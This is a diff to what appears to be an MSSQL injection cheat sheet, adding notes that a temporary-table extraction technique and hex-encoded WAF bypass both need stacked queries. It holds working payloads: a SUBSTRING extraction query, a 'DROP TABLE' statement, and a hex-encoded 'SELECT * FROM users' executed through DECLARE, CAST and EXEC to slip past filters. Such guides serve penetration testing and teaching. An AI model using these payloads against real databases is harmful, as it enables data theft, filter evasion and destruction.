@@ -170,6 +170,8 @@ AND 1=(SELECT TOP 1 SUBSTRING(xy,1,353) FROM TMP_DB);
 AND 1=0; DROP TABLE TMP_DB;
 ```
 
+**Important:** This technique requires stacked queries (multiple statements separated by `;`) and a persistent connection where the temporary table survives between requests. It does not work with simple UNION-based injection or environments where each query runs in isolation.
+
 ### Practical Injection Examples
 
 #### UNION Attack for Tables
@@ -216,12 +218,14 @@ AND 1=0; DROP TABLE TMP_DB;
 
 #### Hex Encoding for WAF Bypass
 
-Execute commands using hex-encoded strings:
+Hex encoding can bypass simple keyword-based WAFs that block strings like `SELECT` or `FROM`. The actual SQL keywords are hidden inside a hex literal, decoded at runtime via `CAST`, and executed dynamically with `EXEC`:
 
 ```sql
 ' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x53454c454354202a2046524f4d207573657273 AS VARCHAR(4000)); EXEC (@S);--
 -- 0x53454c454354202a2046524f4d207573657273 = 'SELECT * FROM users'
 ```
+
+**Note:** This requires stacked queries support. The hex string itself passes through the WAF undetected, but `DECLARE`, `CAST`, and `EXEC` keywords may still be blocked by more sophisticated filters.
 
 #### Blind Extraction
 
